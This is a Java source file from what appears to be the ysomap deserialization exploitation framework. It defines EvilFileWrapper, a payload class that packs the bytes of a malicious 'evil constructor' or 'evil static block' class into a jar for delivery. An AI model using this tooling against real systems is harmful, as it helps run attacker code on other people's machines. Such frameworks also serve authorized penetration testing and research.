package ysomap.core.gadget.payload.objects;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Payloads;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.gadget.bullet.objects.ClassWithEvilConstructor;
import ysomap.serializer.Serializer;
import ysomap.util.ClassFiles;

import java.util.HashMap;
import java.util.Map;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"*"})
@Require(bullets = {"ClassWithEvilConstructor","ClassWithEvilStaticBlock"})
public class EvilFileWrapper extends Payload<byte[]> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof byte[];
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new ClassWithEvilConstructor();
    }

    @Override
    public byte[] pack(Object obj) throws Exception {
        String type = bullet.get("type");
        if(type.equals("jar")){
            String classname = bullet.get("classname");
            Map<String, byte[]> classes = new HashMap<>();
            classes.put(classname, (byte[]) obj);
            return ClassFiles.makeJarWithMultiClazz(classname + ".jar", classes);
        }else {
            return (byte[]) obj;
        }
    }

    @Override
    public Serializer<?> getSerializer() {
        return null;
    }
}
